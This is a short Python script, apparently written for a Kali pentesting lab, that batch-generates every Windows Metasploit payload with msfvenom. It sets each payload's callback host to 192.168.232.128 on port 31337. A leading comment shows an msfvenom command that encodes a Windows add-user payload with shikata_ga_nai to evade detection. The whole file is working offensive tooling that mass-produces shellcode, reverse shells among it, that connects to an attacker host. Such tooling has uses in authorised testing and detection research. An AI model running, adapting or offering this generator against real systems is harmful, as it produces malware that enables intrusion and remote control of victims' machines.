# 
# msfvenom --payload - --platform windows --arch x86 -e x86/shikata_ga_nai -f raw -o /home/kali/Desktop/windows_adduser.bin.encoded < /home/kali/Desktop/windows_adduser.bin


#!/bin/python
print("[#]AUTO_MSFVENOM[#]")

import os

# vars
prefix = "    windows/"
payload_list_file = "payload_list.txt"
payloads_selected = []
payloads_dir = "./payloads"

if (not os.path.exists(payload_list_file)):
    print("payload_list.txt was not found, running msfvenom...")
    cmd = "msfvenom --list payload >> " + payload_list_file
    os.system(cmd)

print("searchong for payloads with prefix: " + prefix)

with open(payload_list_file, 'r') as string_list:
    for word in string_list:
        if word.startswith(prefix):
            pay = word.split()[0]
            payloads_selected.append(pay)

print("number of payloads selected: " + str(len(payloads_selected)))

print("running msfvenom in loop and generate selected payloads...")

if (not os.path.exists(payloads_dir)):
    os.mkdir(payloads_dir)

for pay in payloads_selected:
    cmd = "msfvenom --platform windows -p {} LHOST=192.168.232.128 LPORT=31337 KHOST=192.168.232.128 KPORT=31337 AHOST=192.168.232.128 APORT=31337 DLL=test.dll DNSZONE=corelan.eu CMD=whoami -f raw -o {}/{}.bin".format(pay, payloads_dir, pay.replace('/', "_"))
    os.system(cmd)


print('bye')